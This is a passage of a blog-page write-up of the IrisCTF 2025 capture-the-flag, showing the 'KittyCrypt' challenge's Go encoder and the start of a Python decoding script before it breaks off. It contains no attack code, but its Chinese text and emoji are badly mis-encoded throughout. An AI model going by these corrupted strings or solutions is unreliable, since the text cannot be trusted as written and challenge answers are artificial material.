<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTeam: ICEDTEARank: 402025 å¹´åˆç¬¬ä¸€å ´ CTF å°±ç»çµ¦äº† ICEDTEA å’Œ IrisCTFè¶…ç¾çš„å¹³å°å‰ç«¯ orz   CRYPTOKittyCryptmain.goèšç„¦çœ‹ä¸€ä¸‹é‡é»éƒ¨åˆ†ï¼š   123456789101112131415161718192021222324252627282930313233343536373839404142package">
<meta property="og:type" content="article">
<meta property="og:title" content="IrisCTF 2025 Write Up">
<meta property="og:url" content="http://wha13.github.io/2025/01/06/irisctf-2025/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTeam: ICEDTEARank: 402025 å¹´åˆç¬¬ä¸€å ´ CTF å°±ç»çµ¦äº† ICEDTEA å’Œ IrisCTFè¶…ç¾çš„å¹³å°å‰ç«¯ orz   CRYPTOKittyCryptmain.goèšç„¦çœ‹ä¸€ä¸‹é‡é»éƒ¨åˆ†ï¼š   123456789101112131415161718192021222324252627282930313233343536373839404142package">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/Sy8Zy28Iyx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1FzZnUUye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rynFs28Ike.png">
<meta property="article:published_time" content="2025-01-06T16:51:20.000Z">
<meta property="article:modified_time" content="2025-01-06T08:38:41.641Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="LLL">
<meta property="article:tag" content="pyjail">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/Sy8Zy28Iyx.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>IrisCTF 2025 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/02/htb-steamcloud/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/01/06/irisctf-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/01/06/irisctf-2025/&text=IrisCTF 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/01/06/irisctf-2025/&is_video=false&description=IrisCTF 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IrisCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/01/06/irisctf-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/01/06/irisctf-2025/&name=IrisCTF 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/01/06/irisctf-2025/&t=IrisCTF 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KittyCrypt"><span class="toc-number">2.1.</span> <span class="toc-text">KittyCrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#knutsacque"><span class="toc-number">2.2.</span> <span class="toc-text">knutsacque</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobra%E2%80%99s-Den"><span class="toc-number">3.1.</span> <span class="toc-text">Cobraâ€™s Den</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORENS"><span class="toc-number">4.</span> <span class="toc-text">FORENS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deldeldel"><span class="toc-number">4.1.</span> <span class="toc-text">deldeldel</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        IrisCTF 2025 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-06T16:51:20.000Z" class="dt-published" itemprop="datePublished">2025-01-06</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/LLL/" rel="tag">LLL</a>, <a class="p-category" href="/tags/pyjail/" rel="tag">pyjail</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Team: ICEDTEA<br>Rank: 40<br>2025 å¹´åˆç¬¬ä¸€å ´ CTF å°±ç»çµ¦äº† ICEDTEA å’Œ IrisCTF<br>è¶…ç¾çš„å¹³å°å‰ç«¯ orz<br><img src="https://hackmd.io/_uploads/Sy8Zy28Iyx.png" alt="image">  </p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="KittyCrypt"><a href="#KittyCrypt" class="headerlink" title="KittyCrypt"></a>KittyCrypt</h3><p><strong>main.go</strong><br>èšç„¦çœ‹ä¸€ä¸‹é‡é»éƒ¨åˆ†ï¼š  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å·²çœç•¥...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> CharSet = <span class="keyword">map</span>[<span class="type">rune</span>]<span class="type">string</span>&#123;</span><br><span class="line">	<span class="string">&#x27;0&#x27;</span>: <span class="string">&quot;ğŸ±&quot;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&quot;ğŸˆ&quot;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&quot;ğŸ˜¸&quot;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&quot;ğŸ˜¹&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;4&#x27;</span>: <span class="string">&quot;ğŸ˜º&quot;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&quot;ğŸ˜»&quot;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&quot;ğŸ˜¼&quot;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&quot;ğŸ˜½&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;8&#x27;</span>: <span class="string">&quot;ğŸ˜¾&quot;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&quot;ğŸ˜¿&quot;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&quot;ğŸ™€&quot;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&quot;ğŸ±â€ğŸ‘¤&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;C&#x27;</span>: <span class="string">&quot;ğŸ±â€ğŸ&quot;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&quot;ğŸ±â€ğŸ’»&quot;</span>, <span class="string">&#x27;E&#x27;</span>: <span class="string">&quot;ğŸ±â€ğŸ‘“&quot;</span>, <span class="string">&#x27;F&#x27;</span>: <span class="string">&quot;ğŸ±â€ğŸš€&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">catify</span><span class="params">(input <span class="type">string</span>, keys []<span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> keyedText <span class="type">string</span></span><br><span class="line">	<span class="keyword">var</span> result <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i, char := <span class="keyword">range</span> input &#123;</span><br><span class="line">		keyedText += <span class="type">string</span>(<span class="type">rune</span>(<span class="type">int</span>(char) + keys[i]))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;I2Keyed: %s\n&quot;</span>, keyedText)</span><br><span class="line"></span><br><span class="line">	hexEncoded := strings.ToUpper(hex.EncodeToString([]<span class="type">byte</span>(keyedText)))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;K2Hex: %s\n&quot;</span>, hexEncoded)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, <span class="type">rune</span> := <span class="keyword">range</span> hexEncoded &#123;</span><br><span class="line">		result += CharSet[<span class="type">rune</span>]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å·²çœç•¥...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	input := <span class="string">&quot;You fools! You will never get my catnip!!!!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">	keys := getKeys(<span class="built_in">len</span>(input))</span><br><span class="line"></span><br><span class="line">	encoded := catify(input, keys)</span><br><span class="line"></span><br><span class="line">	savePair(<span class="string">&quot;example&quot;</span>, input, encoded)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åŠ å¯†çš„ä¸»æµç¨‹å…¶å¯¦å°±æ˜¯å¾æŸå€‹ json æª”æ¡ˆè®€å–ä¸€å€‹ int çš„ keyï¼Œæ¥è‘—æŠŠæ˜æ–‡æ¯å€‹å­—æ¯éƒ½åŠ ä¸Šå®ƒå¾Œå†è½‰æˆ hexï¼Œæœ€å¾Œç”¨é‚£å€‹è²“å’ªçš„ CharSet replace æ‰å­—å…ƒ<br>å¦å¤–å®ƒæœ‰çµ¦ä¸€çµ„åŠ è§£å¯†å¾Œçš„ç¯„ä¾‹+è¢«åŠ å¯†å¾Œçš„ flagï¼Œç­‰æ–¼èªªæ¸›å›å»å°±å¥½<br><del>é›£åº¦æ‡‰è©²æ˜¯æƒ³ä¸‹åœ¨ GoLang å°±æ˜¯</del><br><strong>solve.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">org=&#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>: <span class="string">&quot;ğŸ±&quot;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&quot;ğŸˆ&quot;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&quot;ğŸ˜¸&quot;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&quot;ğŸ˜¹&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&quot;ğŸ˜º&quot;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&quot;ğŸ˜»&quot;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&quot;ğŸ˜¼&quot;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&quot;ğŸ˜½&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span>: <span class="string">&quot;ğŸ˜¾&quot;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&quot;ğŸ˜¿&quot;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&quot;ğŸ™€&quot;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&quot;ğŸ±ğŸ‘¤&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;C&#x27;</span>: <span class="string">&quot;ğŸ±ğŸ&quot;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&quot;ğŸ±ğŸ’»&quot;</span>, <span class="string">&#x27;E&#x27;</span>: <span class="string">&quot;ğŸ±ğŸ‘“&quot;</span>, <span class="string">&#x27;F&#x27;</span>: <span class="string">&quot;ğŸ±ğŸš€&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">subtable=&#123;i:j <span class="keyword">for</span> j, i <span class="keyword">in</span> org.items()&#125;</span><br><span class="line"></span><br><span class="line">p1=<span class="string">&#x27;You fools! You will never get my catnip!!!!!!!&#x27;</span></span><br><span class="line">c1=<span class="string">&#x27;ğŸ±ğŸ’»ğŸ˜¸ğŸ˜¿ğŸ˜¼ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ˜¿ğŸ™€ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜¹ğŸ˜¿ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ±ğŸ±ğŸ‘¤ğŸ˜¹ğŸ˜¿ğŸ˜ºğŸ±ğŸ‘“ğŸ˜¹ğŸ™€ğŸ˜¿ğŸ˜¾ğŸ±ğŸğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¾ğŸ±ğŸš€ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ˜¿ğŸ˜½ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ±ğŸ‘¤ğŸ™€ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¸ğŸ™€ğŸ˜¼ğŸ±ğŸ‘¤ğŸˆğŸ±ğŸ‘“ğŸ˜ºğŸ±ğŸ‘¤ğŸ˜¼ğŸ˜¿ğŸ˜¾ğŸ±ğŸ‘“ğŸˆğŸ˜¿ğŸ˜½ğŸ™€ğŸ±ğŸš€ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¾ğŸ˜¹ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ˜¹ğŸ™€ğŸ±ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸ˜½ğŸ˜¿ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ±ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸˆğŸ˜¾ğŸ˜½ğŸ˜¿ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸˆğŸ™€ğŸ±ğŸ‘“ğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸğŸ±ğŸ‘“ğŸˆğŸ±ğŸ‘¤ğŸ±ğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ˜¸ğŸ˜¾ğŸ˜¿ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸ’»ğŸ±ğŸğŸ˜¿ğŸ™€ğŸ±ğŸ‘“ğŸ˜¸ğŸ˜¾ğŸ™€ğŸ™€ğŸ±ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ™€ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸ™€ğŸ˜¾ğŸ˜ºğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ˜½ğŸ˜¿ğŸ˜¸ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ˜¾ğŸ™€ğŸˆğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ˜¼ğŸ™€ğŸ˜¼ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜¿ğŸ˜¿ğŸ˜¿ğŸ±ğŸğŸ˜¿ğŸ˜¾ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜½ğŸ˜¿ğŸ±ğŸğŸ±ğŸ‘“ğŸˆğŸ˜¾ğŸˆğŸ˜¿ğŸ˜¹ğŸ±ğŸ’»ğŸ˜¸ğŸ±ğŸ‘¤ğŸ˜¹ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸ‘“ğŸ™€ğŸ±ğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ˜¸ğŸ™€ğŸ±ğŸğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ˜¼ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸˆğŸ±ğŸ‘¤ğŸˆğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ˜½ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸˆğŸ±ğŸ‘¤ğŸ±ğŸš€ğŸ±ğŸ‘“ğŸ˜ºğŸ±ğŸ‘¤ğŸ˜½ğŸ™€ğŸ˜¿ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸ’»ğŸ™€ğŸ˜¿ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ±ğŸ‘¤ğŸ˜¿ğŸ±ğŸš€ğŸ±ğŸ‘“ğŸ˜¸ğŸ™€ğŸ±ğŸğŸ±ğŸ‘¤ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ±ğŸ’»ğŸ±ğŸ‘¤ğŸ˜¾ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¿ğŸ˜»ğŸ™€ğŸ±ğŸš€ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¿ğŸ˜¿ğŸ˜¿ğŸ˜¿&#x27;</span></span><br><span class="line">c2=<span class="string">&#x27;ğŸ±ğŸ’»ğŸ˜¸ğŸ™€ğŸ˜¼ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜¹ğŸ˜¿ğŸˆğŸ±ğŸ‘“ğŸ±ğŸ±ğŸ‘¤ğŸ˜ºğŸ™€ğŸ˜½ğŸ±ğŸ‘“ğŸ˜¹ğŸ™€ğŸ˜¿ğŸ˜¾ğŸ˜¿ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¾ğŸ±ğŸš€ğŸ±ğŸ‘¤ğŸ±ğŸ’»ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ˜¾ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ˜ºğŸ±ğŸ‘“ğŸ˜¸ğŸ™€ğŸ˜¼ğŸ±ğŸ‘¤ğŸˆğŸ±ğŸ‘“ğŸ˜ºğŸ±ğŸ‘¤ğŸ˜¼ğŸ™€ğŸ˜½ğŸ±ğŸ‘“ğŸˆğŸ˜¿ğŸ˜¾ğŸ±ğŸ‘¤ğŸ±ğŸğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¾ğŸ˜¹ğŸ˜¿ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¹ğŸ™€ğŸ±ğŸ˜¾ğŸ±ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸ˜¼ğŸ˜¿ğŸˆğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ˜¸ğŸ˜¾ğŸ˜¾ğŸ±ğŸ‘“ğŸˆğŸ˜¾ğŸ˜¼ğŸ˜¿ğŸ˜¿ğŸ±ğŸ‘“ğŸˆğŸ™€ğŸ±ğŸ‘“ğŸ™€ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ™€ğŸ±ğŸ‘¤ğŸ±ğŸš€ğŸ±ğŸ‘“ğŸˆğŸ±ğŸ‘¤ğŸ±ğŸ˜¿ğŸˆğŸ±ğŸ‘“ğŸ˜¸ğŸ˜¾ğŸ™€ğŸ±ğŸ‘¤ğŸˆğŸ±ğŸ’»ğŸ±ğŸ‘¤ğŸ™€ğŸ˜¹ğŸ±ğŸ‘“ğŸ˜¸ğŸ˜¾ğŸ˜¿ğŸ™€ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ±ğŸ’»ğŸ™€ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ˜¼ğŸ˜¿ğŸ˜ºğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ˜¿ğŸ±ğŸ‘¤ğŸ˜¹ğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ˜»ğŸ±ğŸ‘¤ğŸ˜¸ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜¿ğŸ™€ğŸ˜¸ğŸ±ğŸğŸ˜¾ğŸ˜¿ğŸˆğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ˜¾ğŸ˜¿ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸˆğŸ˜¾ğŸˆğŸ˜¿ğŸ±ğŸ’»ğŸ±ğŸ’»ğŸ˜¸ğŸ™€ğŸ˜¸ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸ‘“ğŸ±ğŸ‘¤ğŸ˜ºğŸ±ğŸ‘“ğŸ˜ºğŸ™€ğŸ™€ğŸ™€ğŸ±ğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ˜¸ğŸ™€ğŸ™€ğŸ±ğŸ‘“ğŸ˜¹ğŸ±ğŸ‘¤ğŸ˜¼ğŸ±ğŸ‘¤ğŸ±ğŸ’»ğŸ±ğŸ‘“ğŸ±ğŸ™€ğŸ±ğŸ±ğŸ‘¤ğŸ˜¹ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸğŸ˜¾ğŸ˜¹ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸˆğŸ™€ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜ºğŸ±ğŸ‘¤ğŸ˜½ğŸ±ğŸ‘¤ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¿ğŸ±ğŸš€ğŸ˜¾ğŸ±ğŸ±ğŸ‘“ğŸ˜ºğŸ˜¾ğŸ±ğŸğŸ™€ğŸ±ğŸ‘“ğŸ±ğŸ‘“ğŸ˜¸ğŸ™€ğŸ±ğŸ’»ğŸ˜¾ğŸ˜½ğŸ±ğŸ‘“ğŸ˜¸ğŸ±ğŸ‘¤ğŸ±ğŸ‘“ğŸ±ğŸ‘¤ğŸ™€ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¿ğŸ˜¼ğŸ˜¾ğŸ˜»ğŸ±ğŸ‘“ğŸ˜¹ğŸ˜¿ğŸ™€ğŸ±ğŸ‘¤ğŸ˜»&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">reversed</span>(subtable):</span><br><span class="line">    c1=c1.replace(k, 